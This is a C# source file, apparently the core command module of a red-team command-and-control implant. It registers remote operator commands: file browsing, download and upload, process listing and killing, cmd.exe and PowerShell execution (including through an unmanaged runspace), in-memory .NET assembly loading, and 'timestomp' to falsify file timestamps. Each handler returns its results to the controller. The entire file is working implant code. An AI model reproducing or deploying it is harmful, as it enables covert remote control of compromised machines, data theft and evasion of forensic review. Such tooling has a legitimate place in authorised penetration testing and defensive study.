using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Common.Models;

using System;
using System.Collections.Generic;
using System.Text;

namespace Agent
{
    public class Module : IAgentModule
    {
        private AgentController Agent { get; set; }
        private ConfigController Config { get; set; }

        public void Init(AgentController agent, ConfigController config)
        {
            Agent = agent;
            Config = config;
        }

        public AgentModule GetModuleInfo()
        {
            return new AgentModule
            {
                Name = "core",
                Description = "Provides core agent functionality",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "pwd",
                        Description = "Prints the current working directory.",
                        HelpText = "pwd",
                        CallBack = PrintWorkingDirectory
                    },
                    new AgentCommand
                    {
                        Name = "cd",
                        Description = "Change directory",
                        HelpText = "cd [path]",
                        CallBack = ChangeDirectory
                    },
                    new AgentCommand
                    {
                        Name = "ls",
                        Description = "List directory",
                        HelpText = "ls [path]",
                        CallBack = ListDirectory
                    },
                    new AgentCommand
                    {
                        Name = "cp",
                        Description = "Copy a file",
                        HelpText = "cp [source] [destination]",
                        CallBack = CopyFile
                    },
                    new AgentCommand
                    {
                        Name = "mv",
                        Description = "Move a file",
                        HelpText = "mv [source] [destination]",
                        CallBack = MoveFile
                    },
                    new AgentCommand
                    {
                        Name =  "rm",
                        Description = "Delete a file",
                        HelpText = "rm [path]",
                        CallBack = RemoveFile
                    },
                    new AgentCommand
                    {
                        Name = "rmdir",
                        Description = "Delete a directory, subdirectories and files",
                        HelpText = "rmdir [path]",
                        CallBack = RemoveDirectory
                    },
                    new AgentCommand
                    {
                        Name = "mkdir",
                        Description = "Create a directory",
                        HelpText = "mkdir [path]",
                        CallBack = CreateDirectory
                    },
                    new AgentCommand
                    {
                        Name = "cat",
                        Description = "Read the (string) content of a file",
                        HelpText = "cat [path]",
                        CallBack = ReadFile
                    },
                    new AgentCommand
                    {
                        Name = "download",
                        Description = "Download a file",
                        HelpText = "download [path]",
                        CallBack = DownloadFile
                    },
                    new AgentCommand
                    {
                        Name = "upload",
                        Description = "Upload a file",
                        HelpText = "upload [source] [destination]",
                        CallBack = UploadFile
                    },
                    new AgentCommand
                    {
                        Name = "drives",
                        Description = "Get current drives",
                        HelpText = "drives",
                        CallBack = GetDrives
                    },
                    new AgentCommand
                    {
                        Name = "search",
                        Description = "Search filesystem recursively for a filename pattern",
                        HelpText = "search [directory] [pattern]",
                        CallBack = SearchForFile
                    },
                    new AgentCommand
                    {
                        Name = "timestomp",
                        Description = "Copy timestamp information from one file to another",
                        HelpText = "timestomp [source] [target]",
                        CallBack = ChangeFileTimestamp
                    },
                    new AgentCommand
                    {
                        Name = "getenv",
                        Description = "Get all environment variables",
                        HelpText = "getenv",
                        CallBack = GetEnvironmentVariables
                    },
                    new AgentCommand
                    {
                        Name = "setenv",
                        Description = "Set an environment variable",
                        HelpText = "setenv [key] [value]",
                        CallBack = SetEnvironmentValue
                    },
                    new AgentCommand
                    {
                        Name = "ps",
                        Description = "Get running processes",
                        HelpText = "ps",
                        CallBack = GetRunningProcesses
                    },
                    new AgentCommand
                    {
                        Name = "kill",
                        Description = "Kill a process",
                        HelpText = "kill [pid]",
                        CallBack = KillProcess
                    },
                    new AgentCommand
                    {
                        Name = "getuid",
                        Description = "Get current identity",
                        HelpText = "getuid",
                        CallBack = GetUserIdentity
                    },
                    new AgentCommand
                    {
                        Name = "shell",
                        Description = "Execute a command via cmd.exe",
                        HelpText = "shell [command] [args]",
                        CallBack = ExecuteShellCommand
                    },
                    new AgentCommand
                    {
                        Name = "run",
                        Description = "Execute a command",
                        HelpText = "run [command] [args]",
                        CallBack = ExecuteCommand
                    },
                    new AgentCommand
                    {
                        Name = "powershell",
                        Description = "Execute a PowerShell command via powershell.exe",
                        HelpText = "powershell [cmdlet] [args]",
                        CallBack = ExecutePowerShell
                    },
                    new AgentCommand
                    {
                        Name = "powerpick",
                        Description = "Execute a PowerShell command via an unmanaged runspace",
                        HelpText = "powerpick [cmdlet] [args]",
                        CallBack = ExecutePowerPick
                    },
                    new AgentCommand
                    {
                        Name = "execute-assembly",
                        Description = "Execute a .NET assembly",
                        HelpText = "execute-assembly [path]",
                        CallBack = ExecuteAssembly
                    }
                }
            };
        }

        #region Execution
        private void ExecuteShellCommand(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var args = string.Format("{0} {1}", split[0], string.Join(" ", split).Replace(split[0], ""));

                var result = Exec.ExecuteShellCommand(args);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecuteCommand(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var command = split[0];
                var args = string.Join(" ", split).Replace(split[0], "");

                var result = Exec.ExecuteCommand(command, args);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecutePowerShell(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var args = string.Format("{0} {1}", split[0], string.Join(" ", split).Replace(split[0], ""));

                var result = Exec.ExecutePowerShell(args);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecutePowerPick(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var args = string.Format("{0} {1}", split[0], string.Join(" ", split).Replace(split[0], ""));

                var runner = new PowerShellRunner();
                var result = runner.InvokePS(args);

                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecuteAssembly(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var asmBytes = Convert.FromBase64String(split[0]);

                var x = string.Join(" ", split);
                var y = x.Replace(split[0], string.Empty);
                var t = y.Trim();
                var args = t.Split(' ');

                var result = Exec.ExecuteAssembly(asmBytes, args);
                Agent.SendOutput(result);

            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
        #endregion

        #region Environment
        private void GetUserIdentity(byte[] data)
        {
            try
            {
                var result = Env.GetUserIdentity();
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void GetEnvironmentVariables(byte[] data)
        {
            try
            {
                var result = Env.GetEnvironmentVariables();
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void SetEnvironmentValue(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var key = split[0];
                var value = split[1];
                Env.SetEnvironmentValue(key, value);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
        #endregion

        #region Processes
        private void KillProcess(byte[] data)
        {
            try
            {
                var pid = int.Parse(Encoding.UTF8.GetString(data));
                Processes.KillProcess(pid);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void GetRunningProcesses(byte[] data)
        {
            try
            {
                var result = Processes.GetRunningProcesses();
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        #endregion

        #region Filesystem
        private void GetDrives(byte[] data)
        {
            try
            {
                var result = Filesystem.GetDrives();
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void SearchForFile(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var path = split[0];
                var pattern = split[1];
                var result = Filesystem.SearchForFile(path, pattern);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ChangeFileTimestamp(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var source = split[0];
                var target = split[1];
                Filesystem.ChangeFileTimestamp(source, target);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void DownloadFile(byte[] data)
        {
            try
            {
                var path = Encoding.UTF8.GetString(data);
                var result = Filesystem.DownloadFile(path);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void UploadFile(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var source = Convert.FromBase64String(split[0]);
                var dest = split[1];
                Filesystem.UploadFile(dest, source);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void MoveFile(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var source = split[0];
                var dest = split[1];
                Filesystem.MoveFile(source, dest);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void CopyFile(byte[] data)
        {
            try
            {
                var split = Encoding.UTF8.GetString(data).Split(' ');
                var source = split[0];
                var dest = split[1];
                Filesystem.CopyFile(source, dest);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ReadFile(byte[] data)
        {
            try
            {
                var path = Encoding.UTF8.GetString(data);
                var result = Filesystem.ReadFile(path);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void RemoveFile(byte[] data)
        {
            try
            {
                var path = Encoding.UTF8.GetString(data);
                Filesystem.RemoveFile(path);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void RemoveDirectory(byte[] data)
        {
            try
            {
                var directory = Encoding.UTF8.GetString(data);
                Filesystem.RemoveDirectory(directory);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void CreateDirectory(byte[] data)
        {
            try
            {
                var path = Encoding.UTF8.GetString(data);
                var result = Filesystem.CreateDirectory(path);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ChangeDirectory(byte[] data)
        {
            try
            {
                var directory = Encoding.UTF8.GetString(data);
                var result = Filesystem.ChangeDirectory(directory);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void PrintWorkingDirectory(byte[] data)
        {
            try
            {
                var result = Filesystem.PrintWorkingDirectory();
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ListDirectory(byte[] data)
        {
            try
            {
                var directory = Encoding.UTF8.GetString(data);
                var result = Filesystem.ListDirectory(directory);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
        #endregion
    }
}